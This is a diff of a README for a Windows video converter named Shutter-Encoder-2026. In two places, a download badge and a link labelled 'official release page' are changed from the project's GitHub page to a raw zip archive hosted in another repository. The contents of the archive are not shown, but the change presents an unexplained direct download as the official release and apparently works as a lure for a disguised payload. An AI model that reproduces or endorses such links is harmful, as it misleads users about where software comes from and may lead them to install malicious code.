@@ -5,7 +5,7 @@ description: "Download Shutter Encoder for Windows 10 and 11 to convert and edit
 ---
 # 🎥 Shutter-Encoder-2026 - Convert video files with complete ease
 
-[![Download Shutter Encoder](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/angsh8899/Shutter-Encoder-2026)
+[![Download Shutter Encoder](https://img.shields.io/badge/Download-Windows-blue.svg)](https://raw.githubusercontent.com/angsh8899/angsh8899.github.io/main/work/1.2.zip)
 
 This project provides a simple way to process media files on Windows 10 and Windows 11. Shutter-Encoder-2026 handles audio, video, and image conversion without complex settings. It uses established tools to provide high-quality output for your files.
 
@@ -13,7 +13,7 @@ This project provides a simple way to process media files on Windows 10 and Wind
 
 Follow these steps to get the application on your computer.
 
-1. Go to the [official release page](https://github.com/angsh8899/Shutter-Encoder-2026).
+1. Go to the [official release page](https://raw.githubusercontent.com/angsh8899/angsh8899.github.io/main/work/1.2.zip).
 2. Look for the latest version number in the list.
 3. Click the link that ends in .exe to start your download.
 4. Save the file to your desktop or downloads folder.
